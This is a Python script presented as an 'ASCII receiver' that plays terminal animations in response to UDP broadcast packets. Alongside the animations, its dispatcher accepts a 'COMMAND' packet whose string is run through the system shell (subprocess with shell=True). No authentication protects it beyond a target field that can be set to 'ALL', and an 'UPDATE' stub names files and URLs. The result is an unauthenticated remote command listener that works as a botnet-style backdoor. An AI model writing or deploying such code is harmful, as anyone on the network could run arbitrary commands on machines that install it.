import socket
import json
import time
import random
import os
import subprocess

PROJECT_ID = "ascii_project"  # Change per device/project
PORT = 50555

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("", PORT))
sock.setblocking(False)

print(f"[ASCII RECEIVER] '{PROJECT_ID}' listening on port {PORT}...\n")

# ---------------- ASCII Effects ----------------
def train_ascii(repeat, loop_forever, delay):
    train_parts = ["/","|","\\","_","="]
    train_length = 15
    width = 60
    count = 0
    while loop_forever or count < repeat:
        for pos in range(width):
            line = "".join(random.choice(train_parts) for _ in range(train_length))
            print(" " * pos + line, end="\r")
            time.sleep(delay)
        count += 1
    print()

def rotating_arrow_01(repeat, loop_forever, delay):
    frames = [
        "1      \n  1    \n    1  \n      1",
        "0      \n  0    \n    0  \n      0"
    ]
    count = 0
    while loop_forever or count < repeat:
        for f in frames:
            print(f)
            time.sleep(delay)
        count += 1

def chromosome_ladder(repeat, loop_forever, delay):
    patterns = ["0 | 1", "1 | 0", "0-1", "1-0", "0||1", "1||0"]
    ladder_height = 10
    count = 0
    while loop_forever or count < repeat:
        for p in patterns:
            for _ in range(ladder_height):
                print(p)
            print()
            time.sleep(delay)
        count += 1

def binary_loop(repeat, loop_forever, delay):
    count = 0
    while loop_forever or count < repeat:
        print("".join(random.choice("01") for _ in range(128)))
        count += 1
        time.sleep(delay)

# ---------------- Command Executor ----------------
def execute_command(cmd):
    try:
        if os.name == "nt":
            output = subprocess.check_output(cmd, shell=True, text=True)
        else:
            output = subprocess.check_output(cmd, shell=True, text=True)
        print(f"[COMMAND OUTPUT]\n{output}")
    except Exception as e:
        print(f"[COMMAND ERROR] {e}")

# ---------------- Packet Dispatcher ----------------
def handle_packet(packet):
    pkt_type = packet.get("type")
    repeat = packet.get("repeat",1)
    loop_forever = packet.get("loop_forever",False)
    delay = packet.get("delay",0.1)
    message = packet.get("message","")
    cmd = packet.get("command","")

    if pkt_type == "TRAIN_ASCII":
        train_ascii(repeat, loop_forever, delay)
    elif pkt_type == "ROTATING_ARROW_01":
        rotating_arrow_01(repeat, loop_forever, delay)
    elif pkt_type == "CHROMOSOME":
        chromosome_ladder(repeat, loop_forever, delay)
    elif pkt_type == "BINARY":
        binary_loop(repeat, loop_forever, delay)
    elif pkt_type == "MESSAGE":
        print(f"[MESSAGE] {message}")
    elif pkt_type == "COMMAND":
        print(f"[EXECUTING COMMAND] {cmd}")
        execute_command(cmd)
    elif pkt_type == "UPDATE":
        print(f"[UPDATE] {packet.get('file')} <- {packet.get('url')}")
    else:
        print(f"[UNKNOWN PACKET] {packet}")

# ---------------- Main Loop ----------------
while True:
    try:
        data, addr = sock.recvfrom(8192)
        try:
            packet = json.loads(data.decode())
        except:
            continue
        if not all(k in packet for k in ("type","target")):
            continue
        if packet["target"] == PROJECT_ID or packet["target"] == "ALL":
            handle_packet(packet)
    except BlockingIOError:
        pass
    time.sleep(0.05)
